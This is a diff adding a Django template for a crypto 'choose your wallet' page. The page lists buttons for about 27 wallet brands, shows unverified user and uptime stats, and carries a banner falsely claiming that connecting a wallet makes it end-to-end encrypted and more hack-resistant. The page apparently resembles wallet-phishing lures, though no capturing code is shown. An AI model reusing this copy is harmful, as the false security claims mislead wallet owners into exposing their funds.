@@ -1,0 +1,195 @@
+{% extends 'app/base.html' %}
+{% load static %}
+
+{% block extra_head %}
+<link rel="stylesheet" href="{% static 'app/wallet.css' %}" />
+{% endblock %}
+
+{% block content %}
+<div class="wallet-page">
+    <div class="wallet-panel">
+        <div class="wallet-warning">
+            <p>
+                Web3 connects your crypto fully protected because your assets stay on the blockchain,
+                not on an exchange. All your data, keys, and transactions are end-to-end encrypted,
+                meaning only you have access. Once connected, your wallet becomes far more secure
+                and resistant to hacks.
+            </p>
+        </div>
+
+        <div class="wallet-stats">
+            <div class="wallet-stat">
+                <strong>50+</strong>
+                <span>Wallets Supported</span>
+            </div>
+            <div class="wallet-stat">
+                <strong>2M+</strong>
+                <span>Users</span>
+            </div>
+            <div class="wallet-stat">
+                <strong>99.9%</strong>
+                <span>Uptime</span>
+            </div>
+            <div class="wallet-stat">
+                <strong>24/7</strong>
+                <span>Support</span>
+            </div>
+        </div>
+
+        <div class="wallet-searchbar">
+            <input type="text" placeholder="Search wallets" aria-label="Search wallets" />
+            <button type="button" aria-label="Search">
+                <i class="bi bi-search"></i>
+            </button>
+        </div>
+
+        <div class="wallet-filters">
+            <button type="button" class="active">All Wallets</button>
+            <button type="button">Popular</button>
+            <button type="button">Hardware</button>
+            <button type="button">Mobile</button>
+            <button type="button">Web</button>
+        </div>
+
+        <div class="wallet-toolbar">
+            <h2>Choose your wallet</h2>
+            <div class="toggle-wrap">
+                <span>Show uninstalled</span>
+                <button type="button" class="toggle" aria-label="Toggle uninstalled wallets">
+                    <span class="toggle-knob"></span>
+                </button>
+            </div>
+        </div>
+
+        <div class="wallet-section-heading">★ Most Popular Wallets</div>
+        <div class="wallet-section-subhead">▦ All Wallets</div>
+
+        <div class="wallet-grid">
+            <button type="button" class="wallet-card selected">
+                <span class="wallet-logo exodus"><img src="{% static 'app/image/Exodus_Wallet_Logo.png' %}"
+                        alt="Exodus"></span>
+                <span class="wallet-name">Exodus</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo trust"><img src="{% static 'app/image/trust.png' %}" alt="Trust"></span>
+                <span class="wallet-name">Trust</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo wallet-connect"><img src="{% static 'app/image/icon.png' %}"
+                        alt="Wallet Connect"></span>
+                <span class="wallet-name">Wallet Connect</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo metamask"><img src="{% static 'app/image/metamask.webp' %}"
+                        alt="MetaMask"></span>
+                <span class="wallet-name">MetaMask</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo coinbase"><img src="{% static 'app/image/WalletLogo.png' %}"
+                        alt="Coinbase Wallet"></span>
+                <span class="wallet-name">Coinbase Wallet</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo phantom"><img src="{% static 'app/image/phantom.jpg' %}" alt="Phantom"></span>
+                <span class="wallet-name">Phantom</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo nano"><img src="{% static 'app/image/nano.jpg' %}" alt="Nano X Plus"></span>
+                <span class="wallet-name">Nano X Plus</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo tangem"><img src="{% static 'app/image/tangem.png' %}" alt="Tangent"></span>
+                <span class="wallet-name">Tangent</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo arc"><img src="{% static 'app/image/arculus.jpg' %}" alt="Arculus"></span>
+                <span class="wallet-name">Arculus</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo trezor"><img src="{% static 'app/image/trezor.png' %}" alt="Trezor"></span>
+                <span class="wallet-name">Trezor</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo ledger"><img src="{% static 'app/image/ledger.png' %}" alt="Ledger"></span>
+                <span class="wallet-name">Ledger</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo bitbox"><img src="{% static 'app/image/bitbox.webp' %}" alt="Bitbox02"></span>
+                <span class="wallet-name">Bitbox02</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo xaman"><img src="{% static 'app/image/xaman.png' %}" alt="Xaman"></span>
+                <span class="wallet-name">Xaman</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo lobster"><img src="{% static 'app/image/lobstr.png' %}" alt="Lobstr"></span>
+                <span class="wallet-name">Lobstr</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo atomic"><img src="{% static 'app/image/atomic.png' %}" alt="Atomic"></span>
+                <span class="wallet-name">Atomic</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo rainbow"><img src="{% static 'app/image/rainbow.png' %}" alt="Rainbow"></span>
+                <span class="wallet-name">Rainbow</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo argent"><img src="{% static 'app/image/argent.png' %}" alt="Argent"></span>
+                <span class="wallet-name">Argent</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo safepal"><img src="{% static 'app/image/safepal.png' %}" alt="SafePal"></span>
+                <span class="wallet-name">SafePal</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo myetherwallet"><img src="{% static 'app/image/myether.png' %}"
+                        alt="MyEtherWallet"></span>
+                <span class="wallet-name">MyEtherWallet</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo enjin"><img src="{% static 'app/image/enjin.webp' %}" alt="Enjin"></span>
+                <span class="wallet-name">Enjin</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo coinomi"><img src="{% static 'app/image/coinomono.png' %}"
+                        alt="Coinomi"></span>
+                <span class="wallet-name">Coinomi</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo edge"><img src="{% static 'app/image/edge.png' %}" alt="Edge"></span>
+                <span class="wallet-name">Edge</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo zelcore"><img src="{% static 'app/image/zelcore.png' %}" alt="Zelcore"></span>
+                <span class="wallet-name">Zelcore</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo guarda"><img src="{% static 'app/image/guarda.png' %}" alt="Guarda"></span>
+                <span class="wallet-name">Guarda</span>
+            </button>
+
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo mathwallet"><img src="{% static 'app/image/mathwallet.png' %}"
+                        alt="MathWallet"></span>
+                <span class="wallet-name">MathWallet</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo tokenpocket"><img src="{% static 'app/image/tokenpocket.png' %}"
+                        alt="TokenPocket"></span>
+                <span class="wallet-name">TokenPocket</span>
+            </button>
+            <button type="button" class="wallet-card">
+                <span class="wallet-logo alpha"><img src="{% static 'app/image/alpha.png' %}" alt="AlphaWallet"></span>
+                <span class="wallet-name">AlphaWallet</span>
+            </button>
+        </div>
+    </div>
+</div>
+{% endblock %}
